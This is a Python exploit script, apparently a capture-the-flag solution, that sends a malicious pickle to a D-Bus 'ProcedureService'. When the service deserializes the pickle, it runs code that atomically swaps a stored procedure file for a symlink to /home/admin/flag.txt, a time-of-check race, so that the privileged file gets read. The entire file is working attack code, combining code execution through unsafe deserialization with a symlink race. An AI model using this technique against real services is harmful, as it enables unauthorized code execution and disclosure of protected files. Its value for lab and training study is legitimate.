#!/usr/bin/env python3
import dbus
import pickle
import base64
import os
import glob

PROCEDURE_NAME = "atomic_exploit_final"
TARGET_FILE = "/home/admin/flag.txt"
PROCEDURE_PATH_PATTERN = f"/var/procedures/*_{PROCEDURE_NAME}.pkl"

class AtomicRaceExploit(object):
    def __reduce__(self):
        # This is the logic that will run inside the server process.
        # It is designed to be a single, executable string for `exec`.
        atomic_swap_script = f"""
import os
import glob

# Find the path to the procedure file we need to replace.
p_pattern = {repr(PROCEDURE_PATH_PATTERN)}
original_path_list = list(glob.glob(p_pattern))
if original_path_list:
    original_path = original_path_list[0]

    # Define the target file and a unique temporary path for our symlink.
    target = {repr(TARGET_FILE)}
    tmp_path = '/tmp/' + os.urandom(8).hex()

    # 1. Create the symlink in a temporary, writable location.
    os.symlink(target, tmp_path)

    # 2. Atomically move the symlink to replace the original file.
    # This 'rename' operation is the key to winning the race condition.
    os.rename(tmp_path, original_path)
"""

        final_payload = f"print(open('{TARGET_FILE}').read())"

        return (eval, (f"__import__('builtins').exec({repr(atomic_swap_script)}) or {repr(final_payload)}",))

def main():
    print("[*] Creating the final atomic TOCTOU payload...")
    payload_obj = AtomicRaceExploit()
    serialized_data = pickle.dumps(payload_obj)
    b64_payload = base64.b64encode(serialized_data).decode('utf-8')

    print("[*] Connecting to the system D-Bus...")
    try:
        bus = dbus.SystemBus()
        proxy = bus.get_object('com.system.ProcedureService', '/com/system/ProcedureService')
        interface = dbus.Interface(proxy, 'com.system.ProcedureService')
    except dbus.exceptions.DBusException as e:
        print(f"[-] Failed to connect to D-Bus: {e}")
        return

    print(f"[*] Registering procedure '{PROCEDURE_NAME}'...")
    try:
        interface.RemoveProcedure(PROCEDURE_NAME)
    except dbus.exceptions.DBusException:
        pass

    interface.RegisterProcedure(PROCEDURE_NAME, b64_payload)


    print("[*] Executing procedure to trigger the atomic swap...")
    try:
        result = interface.ExecuteProcedure(PROCEDURE_NAME)
        print("\n[+] Attack successful! The flag is:")
        print(result)
    except dbus.exceptions.DBusException as e:
        print(f"[-] An error occurred during execution: {e}")

if __name__ == "__main__":
    main()